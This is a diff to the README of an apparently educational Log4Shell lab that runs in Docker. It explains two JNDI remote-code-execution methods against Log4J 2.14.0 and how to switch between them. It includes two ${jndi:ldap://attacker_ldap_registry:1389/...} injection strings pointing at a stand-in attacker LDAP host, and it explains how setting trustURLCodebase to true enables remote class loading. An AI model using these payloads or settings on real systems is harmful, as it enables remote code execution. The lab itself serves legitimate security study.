@@ -42,14 +42,19 @@ of triggering remote code execution on the victim. One involves a `Reference`
 and a factory, while the other involves serialization.
 
 The factory method is the default, but the which method to use can be chosen by
-modifying the payload given to the victim. Change the `JAVA_OPTS` environment
-variable in the `docker compose` file to define the `victim-payload` system
-property to read either the first or second line depending on whether the former
-or latter method is desired.
+modifying the payload given to the victim. Change the `victim`'s `JAVA_OPTS`
+environment variable in the `docker compose` file to define the `victim-payload`
+system property to read either the first or second line depending on whether the
+former or latter method is desired.
 ```
 $${jndi:ldap://attacker_ldap_registry:1389/cn=made-class,dc=ldap-registry,dc=attacker}
 $${jndi:ldap://attacker_ldap_registry:1389/cn=serialized-class,dc=ldap-registry,dc=attacker}
 ```
+
+Additionally, it seems the serialization method doesn't work on any recent Java
+version without manually setting the `com.sun.jndi.ldap.object.trustURLCodebase`
+system property to `true`. If that method is used, make sure to do that, again
+via the `JAVA_OPTS` environment variable in the `docker compose` file
 
 
 ## Exploit Resources
@@ -117,10 +122,12 @@ method is called on it to trigger RCE.
 
 Obviously, this repository uses an out-of-date version of Log4J - version
 `2.14.0` specifically. It also uses an out-of-date version of Java due to the
-type of exploit it uses. Instead of using gadgets already in the `CLASSPATH`, it
+exploit it uses. Instead of using gadgets already in the `CLASSPATH`, it
 requires the victim to download `.class` files from a remote codebase. This
-capability was made disabled by default through the
-`com.sun.jndi.ldap.object.trustURLCodebase` property just after version `8u171`.
+feature can be enabled in any Java version by setting the system property
+`com.sun.jndi.ldap.object.trustURLCodebase` to `true`. Additionally, the factory
+method works even without that option explicitly set in up to and including Java
+`8u171`.
 
 Additionally, it doesn't add any instrumentation to Log4J itself. It treats the
 library as a black box that allows arbitrary JNDI queries.
